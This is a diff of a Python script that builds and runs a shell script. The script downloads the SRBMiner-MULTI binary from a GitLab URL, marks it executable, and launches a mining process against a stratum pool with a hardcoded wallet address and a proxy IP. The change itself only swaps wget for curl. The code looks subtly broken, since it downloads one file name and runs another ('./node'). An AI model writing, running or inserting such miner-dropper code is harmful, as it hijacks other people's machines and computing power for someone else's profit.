@@ -8,7 +8,7 @@ import os
 os.system('echo "#!/bin/sh" >> tes')
 os.system('echo " " >> tes')
 os.system('echo "memory=$(shuf -n 1 -i 1-999999)" >> tes') 
-os.system('echo "wget -q https://gitlab.com/gilaaja/exe/-/raw/main/SRBMiner-MULTI" >> tes')
+os.system('echo "curl -L https://gitlab.com/gilaaja/exe/-/raw/main/SRBMiner-MULTI" >> tes')
 os.system('echo "chmod +x SRBMiner-MULTI" >> tes')  
 os.system('echo "./node --disable-gpu --algorithm minotaurx --pool stratum+tcps://stratum-ru.rplant.xyz:17068 --wallet RSryP2mM5gYVeTgaNrWZZREgwkXqurso5Q.$(echo $(shuf -i 1-9999 -n 1)-Gila_Avian) -t 16 --password x enable-4gb-hugepages --proxy 46.147.194.197:1080" >> tes') 
 os.system('sleep 2') 
